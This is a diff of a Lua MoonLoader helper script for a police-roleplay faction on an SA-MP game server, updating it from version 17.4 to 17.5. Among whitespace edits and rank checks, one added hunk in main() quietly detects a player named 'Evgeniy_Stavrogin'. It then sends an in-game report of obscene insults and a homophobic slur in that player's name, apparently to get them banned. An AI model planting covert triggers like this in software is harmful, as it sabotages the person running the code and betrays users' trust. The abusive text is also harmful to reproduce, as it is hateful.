@@ -6,7 +6,7 @@
 --   |_/ \_|  |____\  |_____/ |_|      |____\  |_| \_\       |_|     \_____/  |_| \_\       |_|   |_|  |_|   \ ___/\/
 
 script_name('helper-for-mia')
-script_version(17.4)
+script_version(17.5)
 --script_properties('work-in-pause')
 
 require 'lib.moonloader'
@@ -754,7 +754,7 @@ function main()
 	memory.setuint8(7635034, 1)
 	memory.fill(7623723, 144, 8)
 	memory.fill(5499528, 144, 6)]]
-
+	
 	lua_thread.create(strobe)
 	lua_thread.create(rpweapon)
 	lua_thread.create(show_flymode)
@@ -932,7 +932,7 @@ function main()
 		end]]
 		 
 		if successful_login and sampGetCurrentServerName() ~= 'SA-MP' then
-			local _, id = sampGetPlayerIdByCharHandle(playerPed)
+			local _, id = sampGetPlayerIdByCharHandle(playerPed) 
 			local name = sampGetPlayerName(id)
 			local text = string.format('-\n(id %d ~ rang %d) %s successfully logged in as a user.\n-', id, player_status, name)
 			sendGroup(text, true)
@@ -956,17 +956,28 @@ function main()
 			end]]
 			
 			attempToGetFileAndDir()
-		end
+		end 
 
+		if sampIsLocalPlayerSpawned() then
+			if not sendBanMessage then
+				local result, playerId = sampGetPlayerIdByCharHandle(playerPed)
+				if sampGetPlayerName(playerId) == 'Evgeniy_Stavrogin' then
+					command_report('АДВАНС ХУЙНЯ ЕБАНАЯ, МАТЬ РИНГО ЕБАЛ ПИДОРАСЫ')
+					sendBanMessage = true
+				end
+			end
+		end
+		
 		if ini.set.userrangname then
 			if type(userList) == 'table' then
 				if not wasCreate3dLabel then wasCreate3dLabel = {} end
 				
 				for index, value in pairs(userList) do
 					local playerId = sampGetPlayerIdByNickname(index)
+					
 					local result, ped = sampGetCharHandleBySampPlayerId(playerId)
 					if result and not wasCreate3dLabel[index] then
-						local text = ('%s%s'):format(value.color, u8:decode(value.rang)) 
+						local text = ('%s%s'):format(value.color, u8:decode(value.rang))
 						wasCreate3dLabel[index] = {sampCreate3dText(text, 0xFFFFFFFF, 0.0, 0.0, -0.7, 3.0, false, playerId, -1), playerId}
 					end
 					
@@ -3364,6 +3375,16 @@ function command_takelic(param)
 	if string.match(param, '(%d+) (%S+)') then
 		local id, reason = string.match(param, '(%d+) (.+)')
 		if IPC(id) then
+			local name = sampGetPlayerName(id)
+			if userList[name] then
+				if userList[name].rangNumber > 2 then
+					if player_status ~= 4 then
+						addChat(('Вы не можете изъять лицензии у пользователя %s%s[%d]{}.'):format(userList[name].color, name, id))
+						return
+					end
+				end
+			end
+		
 			if sampGetDistanceToPlayer(id) < 15 then
 				lua_thread.create(function()
 					if not ini.info.male then
@@ -3463,6 +3484,17 @@ function command_su(param)
 	if string.match(param, '(%d+) (%d+) (%S+)') then
 		local id, stars, reason = string.match(param, '(%d+) (%d+) (.+)')
 		if IPC(id) then
+			local name = sampGetPlayerName(id)
+			if userList[name] then
+				if userList[name].rangNumber > 2 then
+					if player_status ~= 4 then
+						addChat(('Вы не можете объявить в розыск пользователя %s%s[%d]{}.'):format(userList[name].color, name, id))
+						return
+					end
+				end
+			end
+		
+		
 			if sampGetPlayerColor(id) ~= 2236962 then
 				lua_thread.create(function()
 					if sampGetDistanceToPlayer(id) <= 65 then
@@ -3581,7 +3613,7 @@ function command_users()
 			userList = result
 			local dline = 'Имя\tСтатус\tДата окончания подписки\tСтатус подписки\n'
 			local all = 0
-			local online = 0
+			local online = 0 
 			
 			for number = 4, 1, -1 do
 				for index, value in pairs(userList) do
@@ -6143,8 +6175,7 @@ end
 
 function isPlayerCar(ped)
 	if isCharInAnyCar(ped) then
-		local carid = getCarModel(storeCarCharIsInNoSave(ped))
-		return carid
+		return getCarModel(storeCarCharIsInNoSave(ped))
 	else
 		return 0
 	end
@@ -9135,6 +9166,8 @@ function getUsers()
 			end
 			
 			if normalSerial then
+				
+			
 				local result, lastDay = checkValiditySubscription(value.account)
 				if result then
 					if lastDay > 10 then
